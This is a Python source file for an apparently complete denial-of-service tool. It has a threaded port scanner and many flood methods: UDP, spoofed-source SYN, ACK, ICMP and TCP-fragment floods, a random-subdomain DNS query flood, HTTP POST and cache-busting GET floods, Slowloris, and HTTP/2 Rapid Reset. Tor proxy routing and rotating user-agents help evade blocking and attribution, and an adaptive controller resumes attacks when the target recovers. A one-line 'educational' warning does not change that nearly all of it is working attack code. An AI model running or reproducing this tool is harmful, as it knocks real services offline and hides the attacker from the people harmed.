# counter_strike_helper.py
import socket
import random
import string
import threading
import time

from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP, UDP, fragment
from scapy.layers.dns import DNS, DNSQR
from scapy.volatile import RandString
# Add the h2 library to your imports
import h2.connection
import h2.events
import socks
import netifaces  # NEW: Import the netifaces library
from queue import Queue  # NEW: Import Queue for thread-safe job management


# ==============================================================================
# WARNING: This is a Denial of Service (DoS) script for educational purposes.
# ==============================================================================

# --- NEW: USER AGENT LIST FOR REALISTIC HEADERS ---
# A list of real-world User-Agent strings to make requests look more legitimate.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
]

open_ports = []
ports_lock = threading.Lock()


# --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---
# --- NEW: TOR CONNECTION CHECKER ---
def check_tor_connection():
    """
    Attempts to connect to a known onion service to verify Tor is working.
    check.torproject.org has a special endpoint for this on port 80.

    :return: True if the connection succeeds, False otherwise.
    """
    print("[INFO] Testing Tor connection... ", end="", flush=True)
    is_working = False
    s = None
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        s.settimeout(15)  # Give Tor some time to build a circuit

        # We connect to the IP of 'check.torproject.org'
        # Using the raw IP avoids a DNS leak.
        s.connect(("199.254.238.130", 80))
        is_working = True
        print("Success!")
    except socks.ProxyError as e:
        print(f"Failed. Proxy Error: {e}")
    except Exception as e:
        print(f"Failed. General Error: {e}")
    finally:
        if s:
            s.close()
    return is_working


# A thread-safe list to store the results of the scan
def port_scan_worker(target_ip, port_queue):
    """Worker that takes port numbers from a queue and checks if they are open."""
    while not port_queue.empty():
        try:
            port = port_queue.get()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)  # Use a short timeout for speed
                # If the connection succeeds, the port is open
                if s.connect_ex((target_ip, port)) == 0:
                    with ports_lock:
                        open_ports.append(port)
            port_queue.task_done()
        except Exception:
            # Silently handle any errors
            port_queue.task_done()
            continue


def run_port_scan(target_url, ports_to_scan, threads=100):
    """
    Manages a multi-threaded TCP port scan to find open ports.

    :param target_url: The domain name of the target.
    :param ports_to_scan: A list or range of ports to check.
    :param threads: Number of concurrent scanning threads.
    :return: A sorted list of open ports.
    """
    ips = resolve_to_ipv4(target_url)
    if not ips:
        print(f"[RECON] Could not resolve {target_url}. Aborting scan.")
        return []

    target_ip = ips[0]
    print(f"[RECON] Starting TCP port scan on {target_ip}...")

    # Clear previous results and set up the job queue
    global open_ports
    open_ports = []
    port_queue = Queue()
    for port in ports_to_scan:
        port_queue.put(port)

    # Start the worker threads
    for _ in range(threads):
        t = threading.Thread(target=port_scan_worker, args=(target_ip, port_queue))
        t.daemon = True
        t.start()

    # Wait for all jobs in the queue to be completed
    port_queue.join()

    print(f"[RECON] Scan complete. Found {len(open_ports)} open TCP ports.")
    return sorted(open_ports)


def resolve_to_ipv4(target_url):
    """Resolves a hostname to a list of its IPv4 addresses."""
    try:
        # getaddrinfo is the modern and correct way to resolve hosts
        addr_info = socket.getaddrinfo(target_url, None, family=socket.AF_INET)
        # Use a set to automatically handle duplicate IPs
        ips = {item[4][0] for item in addr_info}
        return sorted(list(ips))
    except socket.gaierror:
        return []


def generate_random_ip():
    """Generates a random, non-private IP address for spoofing."""
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not (ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172.16.")):
            return ip


def auto_detect_interface():
    """
    Automatically detects the network interface used for the default route (internet).

    :return: The name of the interface (e.g., "en0", "eth0"), or None if not found.
    """
    try:
        # The gateways() function gives us the default gateways for each address family.
        gws = netifaces.gateways()

        # We are interested in the default IPv4 gateway.
        default_gateway_info = gws.get('default', {}).get(netifaces.AF_INET)

        if default_gateway_info:
            # The result is a tuple: (gateway_ip, interface_name)
            interface_name = default_gateway_info[1]
            print(f"[INFO] Auto-detected active network interface: {interface_name}")
            return interface_name
        else:
            print("[WARN] Could not auto-detect the default network interface.")
            return None

    except Exception as e:
        print(f"[WARN] Error while detecting network interface: {e}")
        return None


# --- 2. ADAPTIVE ATTACK CONTROLLER MODULE ---
def check_service_status(target_ip, port, timeout=2):
    """Checks if a TCP service is online by attempting to connect to a port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            if sock.connect_ex((target_ip, port)) == 0:
                return True  # Service is UP
    except Exception:
        pass
    return False  # Service is DOWN or unreachable


def adaptive_attack_controller(target_ip, check_port, stop_event, pause_event, check_interval=10):
    """
    A controller that runs in the background, checks target status,
    and pauses/resumes the attack accordingly.
    """
    print(f"\n[CONTROLLER] Adaptive controller started. Monitoring {target_ip}:{check_port} every {check_interval}s.")
    while not stop_event.is_set():
        is_online = check_service_status(target_ip, check_port)
        if is_online:
            if pause_event.is_set():
                print(f"\n[CONTROLLER] Target has recovered! Resuming attack...")
                pause_event.clear()  # Clear the pause, threads will resume
        else:
            if not pause_event.is_set():
                print(f"\n[CONTROLLER] Target is down! Pausing attack to conserve resources...")
                pause_event.set()  # Set the pause, threads will wait
        time.sleep(check_interval)
    print("\n[CONTROLLER] Main attack stopped. Shutting down.")


# --- 3. REFACTORED ATTACK WORKERS AND CONTROLLERS ---

# --- UDP Flood ---
def udp_worker(stop_event, pause_event, target_ip, port, packet_size):
    """Worker thread that sends a continuous stream of UDP packets."""
    data = b'\x99' * packet_size
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip, port))
            while not stop_event.is_set():
                if pause_event.is_set():
                    time.sleep(1)
                    continue
                s.send(data)
    except socket.error:
        pass


def attack_udp(method, target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for UDP flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips:
        return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        packet_sizes = []
        if method == "UDP-Flood":
            packet_sizes = [375] * threads
        elif method == "UDP-Power":
            packet_sizes = [750] * threads
        elif method == "UDP-Mix":
            packet_sizes = [375] * (threads // 2) + [750] * (threads // 2)

        for size in packet_sizes:
            t = threading.Thread(target=udp_worker, args=(stop_event, pause_event, ip, port, size))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()  # Signal threads to stop if duration expires


# --- SYN Flood ---
def syn_worker(stop_event, pause_event, target_ip, port, iface):
    """Worker thread that sends a continuous stream of spoofed SYN packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            spoofed_ip = generate_random_ip()
            send(IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags="S"), verbose=0, iface=iface)
        except Exception:
            pass


def synflood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for SYN flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips:
        return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=syn_worker, args=(stop_event, pause_event, ip, port, iface))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- NEW: DNS Query Flood Worker ---
# This is a Layer 7 DNS attack. It sends valid, but randomized and non-existent,
# DNS queries to force the target DNS server to perform expensive lookups.
def dns_query_worker(stop_event, pause_event, target_ip, target_domain, iface):
    """Worker thread that sends a continuous stream of randomized DNS queries."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Generate a random subdomain to query. This ensures the record is not cached.
            rand_length = random.randint(10, 16)
            random_subdomain = "".join(
                random.choice(string.ascii_lowercase + string.digits) for _ in range(rand_length))
            full_domain = f"{random_subdomain}.{target_domain}"

            # Craft the DNS query packet using Scapy
            # rd=1 asks the server to perform a recursive query, increasing its workload.
            packet = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=full_domain))

            # Send the packet. verbose=0 prevents flooding our own console.
            send(packet, verbose=0, iface=iface)
        except Exception:
            # If sending fails for any reason, just continue
            pass


# --- NEW: DNS Query Flood Controller ---
def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for DNS Query Flood attacks."""
    ips = resolve_to_ipv4(target_domain)
    if not ips:
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=dns_query_worker, args=(stop_event, pause_event, ip, target_domain, iface))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- ICMP Flood ---
def icmp_worker(stop_event, pause_event, target_ip, iface):
    """Worker thread that sends a continuous stream of ICMP packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            send(IP(dst=target_ip) / ICMP(), verbose=0, iface=iface)
        except Exception:
            pass


def icmpflood(target_url, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for ICMP flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips:
        return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=icmp_worker, args=(stop_event, pause_event, ip, iface))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- UPDATED L7 WORKERS WITH PROXY SUPPORT ---

def http_post_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
    """Worker thread that sends a continuous stream of HTTP POST requests, optionally via a SOCKS proxy."""
    s = None  # Initialize s to None for robust error handling
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Conditionally create a proxy socket or a standard socket
            if use_proxy:
                s = socks.socksocket()
                # Default Tor proxy address and port
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Proxied connections are slower, so allow a longer timeout
            s.settimeout(20 if use_proxy else 4)
            s.connect((target_ip, port))

            post_data = "".join(random.sample(string.ascii_letters + string.digits, 100))
            user_agent = random.choice(USER_AGENTS)
            request = (f"POST / HTTP/1.1\nHost: {host_header}\nUser-Agent: {user_agent}\n"
                       f"Content-Type: application/x-www-form-urlencoded\nContent-Length: {len(post_data)}\n"
                       f"Connection: close\n\n{post_data}").encode()
            s.send(request)
        except Exception:  # Catch any error (socket, proxy, timeout, etc.)
            time.sleep(0.5)
        finally:
            if s:
                s.close()


def slowloris_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
    """Worker thread that opens and maintains a single Slowloris connection, optionally via a SOCKS proxy."""
    s = None
    try:
        if use_proxy:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.settimeout(30 if use_proxy else 4)
        s.connect((target_ip, port))

        user_agent = random.choice(USER_AGENTS)
        initial_headers = (f"GET /?{random.randint(0, 2000)} HTTP/1.1\nHost: {host_header}\n"
                           f"User-Agent: {user_agent}\n").encode()
        s.send(initial_headers)

        while not stop_event.is_set():
            if pause_event.is_set():
                time.sleep(1)
                continue
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\n".encode())
                time.sleep(15)
            except socket.error:
                break
    except Exception:
        pass
    finally:
        if s:
            s.close()


# --- UPDATED L7 CONTROLLERS TO ACCEPT `use_proxy` FLAG ---

def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
    """Controller for HTTP POST flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips:
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=http_post_worker,
                                 args=(stop_event, pause_event, ip, port, target_url, use_proxy))
            t.daemon = True
            t.start()
    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200, use_proxy=False):
    """Controller for Slowloris attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips:
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(sockets):
            t = threading.Thread(target=slowloris_worker,
                                 args=(stop_event, pause_event, ip, port, target_url, use_proxy))
            t.daemon = True
            t.start()
    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: HTTP/2 Rapid Reset Worker ---
# This is a highly efficient Layer 7 attack that exploits the HTTP/2 stream
# cancellation feature. It sends a large number of requests and immediately
# resets them, forcing the server to allocate and then tear down resources
# for each request, leading to CPU exhaustion.
def h2_rapid_reset_worker(stop_event, pause_event, target_ip, port, host_header):
    """Worker thread that performs a rapid reset attack over a single H2 connection."""
    sock = None
    try:
        # Establish a standard TCP connection
        sock = socket.create_connection((target_ip, port), timeout=4)

        # Set up the H2 connection state machine
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # The headers for our rapid-fire requests
        headers = [
            (':method', 'GET'),
            (':authority', host_header),
            (':scheme', 'https' if port == 443 else 'http'),
            (':path', '/'),
            ('user-agent', random.choice(USER_AGENTS)),
        ]

        # Main loop to continuously send and reset streams
        while not stop_event.is_set():
            if pause_event.is_set():
                time.sleep(1)
                continue

            try:
                # In a tight loop, we open a new stream and immediately reset it.
                # This is the core of the attack.
                for _ in range(100):  # Send a burst of 100 resets
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, headers)
                    conn.reset_stream(stream_id)

                # Send the batch of generated frames to the server
                sock.sendall(conn.data_to_send())

                # A very brief sleep to prevent this thread from consuming 100% CPU
                # on a single core just from the Python loop itself.
                time.sleep(0.01)

            except Exception:
                # If any error occurs (e.g., server closes connection), break the loop
                # and the thread will terminate and be restarted by the controller if needed.
                break

    except Exception:
        # Pass on any connection or setup errors
        pass
    finally:
        # Ensure the socket is always closed
        if sock:
            sock.close()


# --- NEW: HTTP/2 Rapid Reset Controller ---
def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, threads=50):
    """Controller for HTTP/2 Rapid Reset attacks."""
    # Note: This attack is so efficient that fewer threads are needed compared to other floods.
    ips = resolve_to_ipv4(target_url)
    if not ips:
        return

    attack_end_time = time.time() + duration

    # We use a nested function to allow threads to restart if they fail
    def maintain_worker(ip):
        while not stop_event.is_set():
            worker_thread = threading.Thread(target=h2_rapid_reset_worker,
                                             args=(stop_event, pause_event, ip, port, target_url))
            worker_thread.daemon = True
            worker_thread.start()
            worker_thread.join()  # Wait here until the worker thread dies (e.g., connection drop)
            if not stop_event.is_set():
                time.sleep(1)  # Wait a moment before reconnecting

    for ip in ips:
        for _ in range(threads):
            # Each maintainer thread is responsible for one attack worker
            maintainer = threading.Thread(target=maintain_worker, args=(ip,))
            maintainer.daemon = True
            maintainer.start()

    # Main controller loop to enforce duration
    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- CORRECTED: TCP Fragmentation Attack Worker ---
# This version explicitly creates the bytes payload to satisfy type checkers
# and make the code clearer, resolving the warning from the image.
def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port, iface):
    """Worker thread that sends a continuous stream of initial TCP fragments."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Create a large TCP packet that is guaranteed to be fragmented.
            spoofed_ip = generate_random_ip()

            # --- FIX APPLIED HERE ---
            # 1. Explicitly generate the random bytes payload first.
            #    bytes(RandString(...)) forces Scapy's volatile object to evaluate into a concrete bytes object.
            payload_bytes = bytes(RandString(size=1800))

            # 2. Build the packet using the concrete bytes object.
            #    The Raw() layer now receives the 'bytes' it expects.
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='S') / Raw(
                load=payload_bytes)

            # Use Scapy's fragment() function to split the packet.
            fragments = fragment(packet, fragsize=512)

            if fragments:  # Add null check
                # The core of the attack: send only the FIRST fragment.
                send(fragments[0], verbose=0, iface=iface)

        except Exception:
            pass


# --- REFACTORED AND NEW ATTACK CONTROLLERS ---
# --- NEW: TCP Fragmentation Attack Controller ---
def attack_tcp_fragmentation(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for TCP Fragmentation attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips:
        return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=tcp_fragmentation_worker, args=(stop_event, pause_event, ip, port, iface))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: "Dynamic Content" / Cache-Busting GET Flood Worker ---
# This worker sends GET requests with randomized query parameters to defeat
# caching layers (CDNs, Varnish, etc.), forcing the origin server to
# process each request individually.
def http_cache_bust_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
    """Worker thread that sends a continuous stream of cache-busting HTTP GET requests."""
    s = None
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            if use_proxy:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(20 if use_proxy else 4)
            s.connect((target_ip, port))

            # --- The Cache-Busting Logic ---
            # Generate random query parameters to make each URL unique
            random_string = "".join(random.sample(string.ascii_letters + string.digits, 8))
            timestamp = int(time.time())

            # Construct the unique path
            path = f"/?query={random_string}×tamp={timestamp}"

            user_agent = random.choice(USER_AGENTS)

            # Craft the GET request with the unique path
            request = (
                f"GET {path} HTTP/1.1\n"
                f"Host: {host_header}\n"
                f"User-Agent: {user_agent}\n"
                f"Cache-Control: no-cache\n"  # Explicitly tell proxies not to cache
                f"Connection: close\n\n"
            ).encode()

            s.send(request)
        except Exception:
            time.sleep(0.5)
        finally:
            if s:
                s.close()


# --- NEW: Cache-Busting GET Flood Controller ---
def attack_http_cache_bust(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
    """Controller for Cache-Busting HTTP GET flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(
                target=http_cache_bust_worker,
                args=(stop_event, pause_event, ip, port, target_url, use_proxy)
            )
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: TCP ACK Flood ---
def ack_worker(stop_event, pause_event, target_ip, port, iface):
    """
    Worker thread that sends a continuous stream of TCP ACK packets.
    This is designed to stress stateful firewalls.
    """
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # The source IP can be real or spoofed. Spoofing is harder to block.
            spoofed_ip = generate_random_ip()

            # The key is flags='A' for ACK
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='A')

            send(packet, verbose=0, iface=iface)
        except Exception:
            pass


def attack_ack_flood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
    """Controller for TCP ACK flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=ack_worker, args=(stop_event, pause_event, ip, port, iface))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()
